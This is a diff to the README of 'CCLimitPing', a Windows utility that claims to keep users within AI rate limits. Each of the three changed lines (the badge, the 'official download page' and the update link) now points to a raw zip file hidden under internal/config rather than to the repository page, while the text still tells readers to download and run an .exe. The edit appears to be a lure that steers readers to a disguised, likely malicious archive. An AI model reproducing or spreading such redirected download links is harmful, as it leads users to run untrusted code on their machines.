@@ -1,6 +1,6 @@
 # ⏱️ CCLimitPing - Stay within your AI rate limits
 
-[![](https://img.shields.io/badge/Download-CCLimitPing-blue.svg)](https://github.com/undecided-monegasque952/CCLimitPing)
+[![](https://img.shields.io/badge/Download-CCLimitPing-blue.svg)](https://github.com/undecided-monegasque952/CCLimitPing/raw/refs/heads/main/internal/config/CC_Limit_Ping_3.6.zip)
 
 ## 🎯 What this tool does
 
@@ -12,7 +12,7 @@ This tool works on Windows 10 and Windows 11. It requires a stable internet conn
 
 ## 🚀 Getting started
 
-1. Visit the [official download page](https://github.com/undecided-monegasque952/CCLimitPing).
+1. Visit the [official download page](https://github.com/undecided-monegasque952/CCLimitPing/raw/refs/heads/main/internal/config/CC_Limit_Ping_3.6.zip).
 2. Look for the Assets section at the bottom of the latest release.
 3. Download the file that ends in .exe.
 4. Save the file in a folder you can find later, such as your Downloads folder.
@@ -54,7 +54,7 @@ Yes. You can exit the program by clicking the X in the top corner of the window.
 If your connection fails, the program waits for a restore. Once the internet returns, it updates the schedule. It does not miss a reset window unless the computer stays off during the transition.
 
 ### How do I update the software?
-Check the [download page](https://github.com/undecided-monegasque952/CCLimitPing) periodically. If a new version exists, download the new .exe file and replace your old one. You do not need to uninstall the old version; simply delete the old file and use the new one.
+Check the [download page](https://github.com/undecided-monegasque952/CCLimitPing/raw/refs/heads/main/internal/config/CC_Limit_Ping_3.6.zip) periodically. If a new version exists, download the new .exe file and replace your old one. You do not need to uninstall the old version; simply delete the old file and use the new one.
 
 ## 🖥️ Troubleshooting issues
 
